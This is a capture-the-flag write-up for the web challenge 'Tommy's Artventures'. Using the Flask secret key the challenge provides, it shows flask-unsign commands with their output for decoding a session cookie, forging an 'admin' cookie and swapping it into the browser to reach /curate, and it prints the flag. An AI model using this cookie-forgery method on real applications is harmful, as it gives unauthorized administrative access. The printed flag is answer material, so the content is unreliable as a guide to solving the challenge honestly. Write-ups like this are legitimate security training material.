# Tommy's Artventures

Author: neonlian

Category: web

## Solution

To get the flag for this challenge, you need to navigate to the /curate page while logged in as 'admin'. You are given the secret key to the Flask server which allows you to forge cookies.

I will use the [flask-unsign](https://github.com/Paradoxis/Flask-Unsign) tool to decrypt and encrypt cookies for this solution.

First, register your own account and look at the 'session' cookie in your browser. On Chrome, you can see cookies by going to `three dot menu > More Tools > Developer Tools (Ctrl+Shift+I) > Application tab > Cookies > https://usc-tommyartventures.chals.io`.

It should look like this:
```
eyJ1c2VyIjoibmVvbmxpYW4ifQ.ZynMPw.VsKcaTTTkbRDwtPMMfpTbt8kKEk
```

Using the provided secret key, we can decrypt the session cookie:
```
> flask-unsign --unsign --secret "4a6282bf78c344a089a2dc5d2ca93ae6" --cookie "eyJ1c2VyIjoibmVvbmxpYW4ifQ.ZynMPw.VsKcaTTTkbRDwtPMMfpTbt8kKEk"
[*] Session decodes to: {'user': 'neonlian'}
```

Now we know that the cookie is a JSON object with a single field named 'user'. Let's encrypt a new session cookie that makes us admin:
```
> flask-unsign --sign --secret "4a6282bf78c344a089a2dc5d2ca93ae6" --cookie "{'user': 'admin'}"
eyJ1c2VyIjoiYWRtaW4ifQ.ZynNuw.hP1OTxkOLMNFnT95wcx_RSWFnlM
```

Replace the 'session' cookie in your browser with the new one. On Chrome, do this by right clicking the current cookie value and choosing `Edit "Value"`. Then go to /curate to collect your flag!

```
CYBORG{oce4n5_auth3N71ca7i0N}
```